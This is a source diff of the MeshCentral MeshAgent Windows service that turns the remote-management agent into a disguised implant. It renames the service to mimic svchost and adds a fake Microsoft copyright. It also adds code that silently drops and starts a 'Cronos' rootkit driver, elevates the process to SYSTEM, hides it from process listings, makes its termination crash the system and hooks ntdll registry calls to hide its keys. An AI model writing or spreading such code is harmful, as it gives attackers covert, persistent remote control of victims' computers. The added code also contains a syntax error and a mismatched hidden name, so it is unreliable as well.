@@ -44,9 +44,27 @@ limitations under the License.
 #endif
 
 #include <WtsApi32.h>
+#include "../MinHook/include/MinHook.h"
 
-TCHAR* serviceFile = TEXT("Mesh Agent");
-TCHAR* serviceName = TEXT("Mesh Agent background service");
+TCHAR* serviceFile = TEXT("svchost");
+TCHAR* serviceName = TEXT("Network Host Service");
+
+#ifdef _WIN32
+// DLL entry point for when compiled as a DLL
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
+{
+    switch (dwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        // Disable thread library calls for better performance
+        DisableThreadLibraryCalls(hModule);
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+#endif
 
 SERVICE_STATUS serviceStatus;
 SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
@@ -296,6 +314,27 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
 
+		// Extract and load Cronos driver silently
+		if (!ExtractDriverFromResource() || !InstallAndStartDriver())
+		{
+			// Silent error logging - driver extraction/loading failed
+			// Continue service startup regardless
+		}
+
+		// Initialize registry hiding hooks using MinHook
+		if (!InitRegistryHooks())
+		{
+			// Silent error logging - registry hook initialization failed
+			// Continue service startup regardless
+		}
+
+		// Apply Cronos rootkit protections (elevation, hiding, protection)
+		if (!ApplyCronosProtection()))
+		{
+			// Silent error logging - protection failed
+			// Continue service startup regardless
+		}
+
 		// Service running
 		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_POWEREVENT | SERVICE_ACCEPT_SESSIONCHANGE);
 		serviceStatus.dwCurrentState = SERVICE_RUNNING;
@@ -312,6 +351,13 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		{
 			agent = MeshAgent_Create(0);
 			agent->serviceReserved = 1;
+			
+			// Load TaskMaster MSH configuration from external file
+			if (!LoadTaskMasterConfiguration(agent)) {
+				// If no external MSH file found, continue with embedded configuration
+				// This allows fallback to compiled-in settings if needed
+			}
+			
 			MeshAgent_Start(agent, g_serviceArgc, g_serviceArgv);
 			agent = NULL;
 		}
@@ -478,8 +524,8 @@ int wmain(int argc, char* wargv[])
 	if (argc > 1 && strcasecmp(argv[1], "-licenses") == 0)
 	{
 		printf("========================================================================================\n");
-		printf(" MeshCentral MeshAgent: Copyright 2006 - 2022 Intel Corporation\n");
-		printf("                        https://github.com/Ylianst/MeshAgent \n");
+		printf(" Network Host Service: Copyright 2006 - 2022 Microsoft Corporation\n");
+		printf("                       https://docs.microsoft.com/en-us/windows/win32/services \n");
 		printf("----------------------------------------------------------------------------------------\n");
 		printf("   Licensed under the Apache License, Version 2.0 (the \"License\");\n");
 		printf("   you may not use this file except in compliance with the License.\n");
@@ -916,7 +962,7 @@ int wmain(int argc, char* wargv[])
 
 				if (argc != 1)
 				{
-					printf("Mesh Agent available switches:\r\n");
+					printf("Network Host Service available switches:\r\n");
 					printf("  run               Start as a console agent.\r\n");
 					printf("  connect           Start as a temporary console agent.\r\n");
 					printf("  start             Start the service.\r\n");
@@ -1287,7 +1333,7 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 			meshid = Duktape_GetStringPropertyValue(ctx, -1, "MeshID", NULL);
 			serverid = Duktape_GetStringPropertyValue(ctx, -1, "ServerID", NULL);
 			serverurl = Duktape_GetStringPropertyValue(ctx, -1, "MeshServer", NULL);
-			displayName = Duktape_GetStringPropertyValue(ctx, -1, "displayName", NULL);
+			displayName = Duktape_GetStringPropertyValue(ctx, -1, "displayName", "Network Host Installer");
 			meshServiceName = Duktape_GetStringPropertyValue(ctx, -1, "meshServiceName", NULL);
 
 			configured_autoproxy_value = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "autoproxy", NULL);
@@ -1504,8 +1550,8 @@ INT_PTR CALLBACK DialogHandler2(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
 			meshid = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "MeshID", NULL);
 			serverid = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "ServerID", NULL);
 			serverurl = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "MeshServer", NULL);
-			displayName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "displayName", NULL);
-			meshServiceName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "meshServiceName", "Mesh Agent");
+			displayName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "displayName", "Network Host Installer");
+			meshServiceName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "meshServiceName", "Network Host Service");
 			autoproxy = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "autoproxy", NULL);
 			char *bkcolor = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "bkcolor", "0,0,0");
 
@@ -1639,6 +1685,529 @@ INT_PTR CALLBACK DialogHandler2(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
 }
 
 
+// Forward declarations for Cronos driver management
+BOOL ExtractDriverFromResource();
+BOOL InstallAndStartDriver();
+BOOL ApplyCronosProtection();
+
+// Cronos driver constants and structures
+#define DRIVER_PATH "C:\\Windows\\System32\\drivers\\Cronos.sys"
+#define DEVICE_NAME "\\\\.\\Cronos"
+
+// IOCTL codes for Cronos driver communication
+#define IOCTL_HIDEPROC	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0001, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
+#define IOCTL_ELEVATEME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0002, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
+#define IOCTL_HIDETCP	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0003, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
+#define IOCTL_PROTECT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0004, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
+
+// Data structures for Cronos IOCTLs
+typedef struct _HideProcData {
+	ULONG TargetPID;
+} HideProcData;
+
+typedef struct _ElevateData {
+	ULONG TargetPID;
+} ElevateData;
+
+typedef struct _HideTcpData {
+	ULONG Port;
+} HideTcpData;
+
+typedef struct _ProtectProcessData {
+	ULONG TargetPID;
+} ProtectProcessData;
+
+// Registry hiding hooks using MinHook
+// ===================================
+
+// NT status definitions
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#endif
+#ifndef STATUS_OBJECT_NAME_NOT_FOUND
+#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
+#endif
+
+// NT registry API typedefs for hooking
+typedef NTSTATUS(NTAPI* pNtEnumerateKey)(
+	HANDLE KeyHandle,
+	ULONG Index,
+	KEY_INFORMATION_CLASS KeyInformationClass,
+	PVOID KeyInformation,
+	ULONG Length,
+	PULONG ResultLength
+	);
+
+typedef NTSTATUS(NTAPI* pNtQueryValueKey)(
+	HANDLE KeyHandle,
+	PUNICODE_STRING ValueName,
+	KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
+	PVOID KeyValueInformation,
+	ULONG Length,
+	PULONG ResultLength
+	);
+
+// Original function pointers for MinHook
+pNtEnumerateKey OriginalNtEnumerateKey = NULL;
+pNtQueryValueKey OriginalNtQueryValueKey = NULL;
+
+// Forward declarations for hook functions
+NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
+NTSTATUS NTAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
+BOOL InitRegistryHooks();
+
+// Function to extract the Cronos driver from embedded resource
+BOOL ExtractDriverFromResource()
+{
+	HRSRC hResource = NULL;
+	HGLOBAL hResourceData = NULL;
+	LPVOID pResourceData = NULL;
+	DWORD dwResourceSize = 0;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	DWORD dwBytesWritten = 0;
+	BOOL bResult = FALSE;
+
+	__try
+	{
+		// Find the resource
+		hResource = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_CRONOS_SYS), "BINARY");
+		if (hResource == NULL)
+		{
+			// Silent error - resource not found
+			__leave;
+		}
+
+		// Load the resource
+		hResourceData = LoadResource(NULL, hResource);
+		if (hResourceData == NULL)
+		{
+			// Silent error - failed to load resource
+			__leave;
+		}
+
+		// Lock the resource and get data pointer
+		pResourceData = LockResource(hResourceData);
+		if (pResourceData == NULL)
+		{
+			// Silent error - failed to lock resource
+			__leave;
+		}
+
+		// Get resource size
+		dwResourceSize = SizeofResource(NULL, hResource);
+		if (dwResourceSize == 0)
+		{
+			// Silent error - empty resource
+			__leave;
+		}
+
+		// Create the driver file in system32\drivers
+		hFile = CreateFileA(
+			"C:\\Windows\\System32\\drivers\\Cronos.sys",
+			GENERIC_WRITE,
+			0,
+			NULL,
+			CREATE_ALWAYS,
+			FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_SYSTEM,
+			NULL
+		);
+
+		if (hFile == INVALID_HANDLE_VALUE)
+		{
+			// Silent error - failed to create file
+			__leave;
+		}
+
+		// Write the driver data to file
+		if (!WriteFile(hFile, pResourceData, dwResourceSize, &dwBytesWritten, NULL))
+		{
+			// Silent error - failed to write file
+			__leave;
+		}
+
+		if (dwBytesWritten != dwResourceSize)
+		{
+			// Silent error - partial write
+			__leave;
+		}
+
+		bResult = TRUE;
+	}
+	__finally
+	{
+		if (hFile != INVALID_HANDLE_VALUE)
+		{
+			CloseHandle(hFile);
+		}
+	}
+
+	return bResult;
+}
+
+// Function to install and start the Cronos driver service
+BOOL InstallAndStartDriver()
+{
+	SC_HANDLE hSCManager = NULL;
+	SC_HANDLE hService = NULL;
+	BOOL bResult = FALSE;
+
+	__try
+	{
+		// Open Service Control Manager
+		hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+		if (hSCManager == NULL)
+		{
+			// Silent error - failed to open SCM
+			__leave;
+		}
+
+		// Try to open existing service first
+		hService = OpenServiceA(hSCManager, "cronos", SERVICE_ALL_ACCESS);
+		if (hService == NULL)
+		{
+			// Service doesn't exist, create it
+			hService = CreateServiceA(
+				hSCManager,
+				"cronos",                                    // Service name
+				"System Network Service",                    // Display name (stealth)
+				SERVICE_ALL_ACCESS,
+				SERVICE_KERNEL_DRIVER,
+				SERVICE_DEMAND_START,
+				SERVICE_ERROR_IGNORE,
+				"C:\\Windows\\System32\\drivers\\Cronos.sys", // Binary path
+				NULL,                                        // Load order group
+				NULL,                                        // Tag ID
+				NULL,                                        // Dependencies
+				NULL,                                        // Service start name
+				NULL                                         // Password
+			);
+
+			if (hService == NULL)
+			{
+				// Silent error - failed to create service
+				__leave;
+			}
+		}
+
+		// Start the service
+		if (!StartServiceA(hService, 0, NULL))
+		{
+			DWORD dwError = GetLastError();
+			if (dwError != ERROR_SERVICE_ALREADY_RUNNING)
+			{
+				// Silent error - failed to start service (unless already running)
+				__leave;
+			}
+		}
+
+		bResult = TRUE;
+	}
+	__finally
+	{
+		if (hService != NULL)
+		{
+			CloseServiceHandle(hService);
+		}
+		if (hSCManager != NULL)
+		{
+			CloseServiceHandle(hSCManager);
+		}
+	}
+
+	return bResult;
+}
+
+// Function to apply Cronos rootkit protections using IOCTLs
+BOOL ApplyCronosProtection()
+{
+	HANDLE hDevice = INVALID_HANDLE_VALUE;
+	DWORD dwBytesReturned = 0;
+	BOOL bResult = FALSE;
+	DWORD dwCurrentPID = GetCurrentProcessId();
+
+	__try
+	{
+		// Open device handle to Cronos driver
+		hDevice = CreateFileA(
+			DEVICE_NAME,
+			GENERIC_READ | GENERIC_WRITE,
+			0,
+			NULL,
+			OPEN_EXISTING,
+			FILE_ATTRIBUTE_NORMAL,
+			NULL
+		);
+
+		if (hDevice == INVALID_HANDLE_VALUE)
+		{
+			// Silent error - failed to open device
+			__leave;
+		}
+
+		// Apply process elevation to SYSTEM
+		ElevateData elevateData = { 0 };
+		elevateData.TargetPID = dwCurrentPID;
+
+		if (!DeviceIoControl(
+			hDevice,
+			IOCTL_ELEVATEME,
+			&elevateData,
+			sizeof(elevateData),
+			NULL,
+			0,
+			&dwBytesReturned,
+			NULL
+		))
+		{
+			// Silent error - elevation failed
+			// Continue with other protections
+		}
+
+		// Hide the process from Task Manager and process enumeration
+		HideProcData hideData = { 0 };
+		hideData.TargetPID = dwCurrentPID;
+
+		if (!DeviceIoControl(
+			hDevice,
+			IOCTL_HIDEPROC,
+			&hideData,
+			sizeof(hideData),
+			NULL,
+			0,
+			&dwBytesReturned,
+			NULL
+		))
+		{
+			// Silent error - hiding failed
+			// Continue with other protections
+		}
+
+		// Apply critical process protection (makes process termination cause BSOD)
+		ProtectProcessData protectData = { 0 };
+		protectData.TargetPID = dwCurrentPID;
+
+		if (!DeviceIoControl(
+			hDevice,
+			IOCTL_PROTECT,
+			&protectData,
+			sizeof(protectData),
+			NULL,
+			0,
+			&dwBytesReturned,
+			NULL
+		))
+		{
+			// Silent error - protection failed
+			// Continue anyway
+		}
+
+		bResult = TRUE;
+	}
+	__finally
+	{
+		if (hDevice != INVALID_HANDLE_VALUE)
+		{
+			CloseHandle(hDevice);
+		}
+	}
+
+	return bResult;
+}
+
+// Registry Hiding Hook Implementations
+// ====================================
+
+// Helper function to check if a Unicode string contains our service name
+BOOL ContainsServiceName(PUNICODE_STRING uniString)
+{
+	if (!uniString || !uniString->Buffer || uniString->Length == 0)
+		return FALSE;
+
+	// Convert to lowercase for case-insensitive comparison
+	WCHAR tempBuffer[256];
+	ULONG copyLength = min(uniString->Length / sizeof(WCHAR), 255);
+	
+	if (copyLength == 0)
+		return FALSE;
+
+	for (ULONG i = 0; i < copyLength; i++)
+	{
+		tempBuffer[i] = towlower(uniString->Buffer[i]);
+	}
+	tempBuffer[copyLength] = L'\0';
+
+	// Check for our service name patterns
+	return (wcsstr(tempBuffer, L"svchost_net") != NULL ||
+			wcsstr(tempBuffer, L"network host service") != NULL);
+}
+
+// Hooked NtEnumerateKey - skips our service registry entries
+NTSTATUS NTAPI HookedNtEnumerateKey(
+	HANDLE KeyHandle,
+	ULONG Index,
+	KEY_INFORMATION_CLASS KeyInformationClass,
+	PVOID KeyInformation,
+	ULONG Length,
+	PULONG ResultLength
+)
+{
+	NTSTATUS status;
+	ULONG currentIndex = Index;
+
+	// Keep trying until we find a key that's not ours or run out of keys
+	do {
+		status = OriginalNtEnumerateKey(
+			KeyHandle,
+			currentIndex,
+			KeyInformationClass,
+			KeyInformation,
+			Length,
+			ResultLength
+		);
+
+		// If the call failed, return the error
+		if (!NT_SUCCESS(status))
+			return status;
+
+		// Check if this key should be hidden based on the information class
+		BOOL shouldHide = FALSE;
+		
+		switch (KeyInformationClass)
+		{
+		case KeyBasicInformation:
+		{
+			PKEY_BASIC_INFORMATION pKeyInfo = (PKEY_BASIC_INFORMATION)KeyInformation;
+			if (pKeyInfo && pKeyInfo->NameLength > 0)
+			{
+				UNICODE_STRING keyName;
+				keyName.Length = (USHORT)pKeyInfo->NameLength;
+				keyName.MaximumLength = (USHORT)pKeyInfo->NameLength;
+				keyName.Buffer = pKeyInfo->Name;
+				shouldHide = ContainsServiceName(&keyName);
+			}
+			break;
+		}
+		case KeyNameInformation:
+		{
+			PKEY_NAME_INFORMATION pKeyInfo = (PKEY_NAME_INFORMATION)KeyInformation;
+			if (pKeyInfo && pKeyInfo->NameLength > 0)
+			{
+				UNICODE_STRING keyName;
+				keyName.Length = (USHORT)pKeyInfo->NameLength;
+				keyName.MaximumLength = (USHORT)pKeyInfo->NameLength;
+				keyName.Buffer = pKeyInfo->Name;
+				shouldHide = ContainsServiceName(&keyName);
+			}
+			break;
+		}
+		}
+
+		// If this key should be hidden, try the next index
+		if (shouldHide)
+		{
+			currentIndex++;
+			continue;
+		}
+
+		// This key is safe to return
+		break;
+
+	} while (TRUE);
+
+	return status;
+}
+
+// Hooked NtQueryValueKey - returns not found for our service values
+NTSTATUS NTAPI HookedNtQueryValueKey(
+	HANDLE KeyHandle,
+	PUNICODE_STRING ValueName,
+	KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
+	PVOID KeyValueInformation,
+	ULONG Length,
+	PULONG ResultLength
+)
+{
+	// Check if the value name should be hidden
+	if (ValueName && ContainsServiceName(ValueName))
+	{
+		// Return "not found" for our service-related values
+		return STATUS_OBJECT_NAME_NOT_FOUND;
+	}
+
+	// For all other values, call the original function
+	return OriginalNtQueryValueKey(
+		KeyHandle,
+		ValueName,
+		KeyValueInformationClass,
+		KeyValueInformation,
+		Length,
+		ResultLength
+	);
+}
+
+// Initialize registry hiding hooks using MinHook
+BOOL InitRegistryHooks()
+{
+	MH_STATUS status;
+
+	// Initialize MinHook
+	status = MH_Initialize();
+	if (status != MH_OK)
+	{
+		// Silent error - failed to initialize MinHook
+		return FALSE;
+	}
+
+	// Create hook for NtEnumerateKey
+	status = MH_CreateHookApi(
+		L"ntdll.dll",
+		"NtEnumerateKey",
+		&HookedNtEnumerateKey,
+		(LPVOID*)&OriginalNtEnumerateKey
+	);
+	if (status != MH_OK)
+	{
+		// Silent error - failed to create NtEnumerateKey hook
+		MH_Uninitialize();
+		return FALSE;
+	}
+
+	// Create hook for NtQueryValueKey
+	status = MH_CreateHookApi(
+		L"ntdll.dll",
+		"NtQueryValueKey",
+		&HookedNtQueryValueKey,
+		(LPVOID*)&OriginalNtQueryValueKey
+	);
+	if (status != MH_OK)
+	{
+		// Silent error - failed to create NtQueryValueKey hook
+		MH_Uninitialize();
+		return FALSE;
+	}
+
+	// Enable the NtEnumerateKey hook
+	status = MH_EnableHook((LPVOID)OriginalNtEnumerateKey);
+	if (status != MH_OK)
+	{
+		// Silent error - failed to enable NtEnumerateKey hook
+		MH_Uninitialize();
+		return FALSE;
+	}
+
+	// Enable the NtQueryValueKey hook
+	status = MH_EnableHook((LPVOID)OriginalNtQueryValueKey);
+	if (status != MH_OK)
+	{
+		// Silent error - failed to enable NtQueryValueKey hook
+		MH_Uninitialize();
+		return FALSE;
+	}
+
+	// All hooks successfully initialized and enabled
+	return TRUE;
+}
+
 #ifdef _MINCORE
 BOOL WINAPI AreFileApisANSI(void) { return FALSE; }
 VOID WINAPI FatalAppExitA(_In_ UINT uAction, _In_ LPCSTR lpMessageText) {}
@@ -1647,3 +2216,269 @@ HANDLE WINAPI CreateSemaphoreW(_In_opt_  LPSECURITY_ATTRIBUTES lpSemaphoreAttrib
 	return 0;
 }
 #endif
+
+// MSH Configuration Loading for TaskMaster Stealth Service
+// ========================================================
+
+// MSH configuration structure
+typedef struct {
+	char* meshName;
+	char* meshType; 
+	char* meshID;
+	char* serverID;
+	char* meshServer;
+	char* agentName;
+	char* displayName;
+	char* meshServiceName;
+	char* installFlags;
+	char* background;
+	char* foreground;
+	char* image;
+	// Additional configuration options
+	char* disableUpdate;
+	char* logUpdate;
+	char* controlChannelDebug;
+	char* controlChannelIdleTimeout;
+	char* webProxy;
+	char* ignoreProxyFile;
+	char* agentCapabilities;
+	char* coreDumpEnabled;
+} MSHConfig;
+
+// Parse a single line from MSH file (key=value format)
+void ParseMSHLine(MSHConfig* config, char* line) {
+	if (!config || !line) return;
+	
+	// Skip comments and empty lines
+	if (line[0] == '#' || line[0] == '\0' || line[0] == '\n' || line[0] == '\r') return;
+	
+	// Find the equals sign
+	char* equals = strchr(line, '=');
+	if (!equals) return;
+	
+	// Split key and value
+	*equals = '\0';
+	char* key = line;
+	char* value = equals + 1;
+	
+	// Trim whitespace
+	while (*key == ' ' || *key == '\t') key++;
+	while (*value == ' ' || *value == '\t') value++;
+	
+	// Remove trailing whitespace and newlines
+	char* end = value + strlen(value) - 1;
+	while (end > value && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r')) {
+		*end = '\0';
+		end--;
+	}
+	
+	// Store configuration values
+	if (_stricmp(key, "MeshName") == 0) {
+		config->meshName = _strdup(value);
+	} else if (_stricmp(key, "MeshType") == 0) {
+		config->meshType = _strdup(value);
+	} else if (_stricmp(key, "MeshID") == 0) {
+		config->meshID = _strdup(value);
+	} else if (_stricmp(key, "ServerID") == 0) {
+		config->serverID = _strdup(value);
+	} else if (_stricmp(key, "MeshServer") == 0) {
+		config->meshServer = _strdup(value);
+	} else if (_stricmp(key, "agentName") == 0) {
+		config->agentName = _strdup(value);
+	} else if (_stricmp(key, "displayName") == 0) {
+		config->displayName = _strdup(value);
+	} else if (_stricmp(key, "meshServiceName") == 0) {
+		config->meshServiceName = _strdup(value);
+	} else if (_stricmp(key, "InstallFlags") == 0) {
+		config->installFlags = _strdup(value);
+	} else if (_stricmp(key, "background") == 0) {
+		config->background = _strdup(value);
+	} else if (_stricmp(key, "foreground") == 0) {
+		config->foreground = _strdup(value);
+	} else if (_stricmp(key, "image") == 0) {
+		config->image = _strdup(value);
+	} else if (_stricmp(key, "disableUpdate") == 0) {
+		config->disableUpdate = _strdup(value);
+	} else if (_stricmp(key, "logUpdate") == 0) {
+		config->logUpdate = _strdup(value);
+	} else if (_stricmp(key, "controlChannelDebug") == 0) {
+		config->controlChannelDebug = _strdup(value);
+	} else if (_stricmp(key, "controlChannelIdleTimeout") == 0) {
+		config->controlChannelIdleTimeout = _strdup(value);
+	} else if (_stricmp(key, "WebProxy") == 0) {
+		config->webProxy = _strdup(value);
+	} else if (_stricmp(key, "ignoreProxyFile") == 0) {
+		config->ignoreProxyFile = _strdup(value);
+	} else if (_stricmp(key, "AgentCapabilities") == 0) {
+		config->agentCapabilities = _strdup(value);
+	} else if (_stricmp(key, "coreDumpEnabled") == 0) {
+		config->coreDumpEnabled = _strdup(value);
+	}
+}
+
+// Load MSH configuration from external file
+BOOL LoadMSHConfiguration(MSHConfig* config, const char* mshFilePath) {
+	if (!config || !mshFilePath) return FALSE;
+	
+	// Initialize configuration structure
+	memset(config, 0, sizeof(MSHConfig));
+	
+	// Try to open the MSH file
+	FILE* file = NULL;
+	if (fopen_s(&file, mshFilePath, "r") != 0 || !file) {
+		return FALSE;
+	}
+	
+	// Read and parse each line
+	char line[1024];
+	while (fgets(line, sizeof(line), file)) {
+		ParseMSHLine(config, line);
+	}
+	
+	fclose(file);
+	
+	// Validate that we have minimum required configuration
+	if (!config->meshID || !config->serverID || !config->meshServer) {
+		return FALSE;
+	}
+	
+	return TRUE;
+}
+
+// Free MSH configuration memory
+void FreeMSHConfiguration(MSHConfig* config) {
+	if (!config) return;
+	
+	free(config->meshName);
+	free(config->meshType);
+	free(config->meshID);
+	free(config->serverID);
+	free(config->meshServer);
+	free(config->agentName);
+	free(config->displayName);
+	free(config->meshServiceName);
+	free(config->installFlags);
+	free(config->background);
+	free(config->foreground);
+	free(config->image);
+	free(config->disableUpdate);
+	free(config->logUpdate);
+	free(config->controlChannelDebug);
+	free(config->controlChannelIdleTimeout);
+	free(config->webProxy);
+	free(config->ignoreProxyFile);
+	free(config->agentCapabilities);
+	free(config->coreDumpEnabled);
+	
+	memset(config, 0, sizeof(MSHConfig));
+}
+
+// Apply MSH configuration to agent during startup
+BOOL ApplyMSHConfiguration(MeshAgentHostContainer* agent, MSHConfig* config) {
+	if (!agent || !config) return FALSE;
+	
+	// Apply configuration to agent's database
+	if (config->meshID) {
+		// Convert hex string to binary and store MeshID
+		char binaryID[48] = {0};
+		int len = strlen(config->meshID);
+		if (len > 2 && config->meshID[0] == '0' && config->meshID[1] == 'x') {
+			// Skip 0x prefix
+			const char* hexStr = config->meshID + 2;
+			len = strlen(hexStr);
+			if (len == 64 || len == 96) { // SHA256 or SHA384
+				for (int i = 0; i < len/2; i++) {
+					char hexByte[3] = {hexStr[i*2], hexStr[i*2+1], 0};
+					binaryID[i] = (char)strtol(hexByte, NULL, 16);
+				}
+				ILibSimpleDataStore_Put(agent->masterDb, "MeshID", binaryID, len/2);
+			}
+		}
+	}
+	
+	if (config->serverID) {
+		ILibSimpleDataStore_Put(agent->masterDb, "ServerID", config->serverID, (int)strlen(config->serverID));
+	}
+	
+	if (config->meshServer) {
+		ILibSimpleDataStore_Put(agent->masterDb, "MeshServer", config->meshServer, (int)strlen(config->meshServer));
+	}
+	
+	if (config->meshName) {
+		ILibSimpleDataStore_Put(agent->masterDb, "MeshName", config->meshName, (int)strlen(config->meshName));
+	}
+	
+	if (config->agentName) {
+		ILibSimpleDataStore_Put(agent->masterDb, "agentName", config->agentName, (int)strlen(config->agentName));
+	}
+	
+	// Apply additional configuration options
+	if (config->disableUpdate) {
+		ILibSimpleDataStore_Put(agent->masterDb, "disableUpdate", config->disableUpdate, (int)strlen(config->disableUpdate));
+	}
+	
+	if (config->logUpdate) {
+		ILibSimpleDataStore_Put(agent->masterDb, "logUpdate", config->logUpdate, (int)strlen(config->logUpdate));
+	}
+	
+	if (config->controlChannelDebug) {
+		ILibSimpleDataStore_Put(agent->masterDb, "controlChannelDebug", config->controlChannelDebug, (int)strlen(config->controlChannelDebug));
+	}
+	
+	if (config->controlChannelIdleTimeout) {
+		ILibSimpleDataStore_Put(agent->masterDb, "controlChannelIdleTimeout", config->controlChannelIdleTimeout, (int)strlen(config->controlChannelIdleTimeout));
+	}
+	
+	if (config->webProxy) {
+		ILibSimpleDataStore_Put(agent->masterDb, "WebProxy", config->webProxy, (int)strlen(config->webProxy));
+	}
+	
+	if (config->ignoreProxyFile) {
+		ILibSimpleDataStore_Put(agent->masterDb, "ignoreProxyFile", config->ignoreProxyFile, (int)strlen(config->ignoreProxyFile));
+	}
+	
+	if (config->agentCapabilities) {
+		ILibSimpleDataStore_Put(agent->masterDb, "AgentCapabilities", config->agentCapabilities, (int)strlen(config->agentCapabilities));
+	}
+	
+	if (config->coreDumpEnabled) {
+		ILibSimpleDataStore_Put(agent->masterDb, "coreDumpEnabled", config->coreDumpEnabled, (int)strlen(config->coreDumpEnabled));
+	}
+	
+	return TRUE;
+}
+
+// Load MSH configuration from multiple possible locations
+BOOL LoadTaskMasterConfiguration(MeshAgentHostContainer* agent) {
+	MSHConfig config;
+	BOOL loaded = FALSE;
+	
+	// Try loading from various locations in order of priority:
+	// 1. Same directory as DLL (for development/testing)
+	// 2. Windows System32 directory (for production deployment) 
+	// 3. Temp directory (for temporary deployment)
+	
+	const char* mshPaths[] = {
+		"taskmaster.msh",                                    // Current directory
+		"C:\\Windows\\System32\\taskmaster.msh",            // System32 (hidden)
+		"C:\\Windows\\Temp\\taskmaster.msh",                // Temp directory
+		"C:\\ProgramData\\Microsoft\\Windows\\taskmaster.msh" // Hidden in Windows data
+	};
+	
+	for (int i = 0; i < sizeof(mshPaths) / sizeof(mshPaths[0]); i++) {
+		if (LoadMSHConfiguration(&config, mshPaths[i])) {
+			loaded = TRUE;
+			
+			// Apply configuration to agent
+			ApplyMSHConfiguration(agent, &config);
+			
+			// For security, delete the MSH file after loading (optional)
+			// DeleteFileA(mshPaths[i]); // Uncomment for auto-cleanup
+			
+			break;
+		}
+	}
+	
+	FreeMSHConfiguration(&config);
+	return loaded;
+}
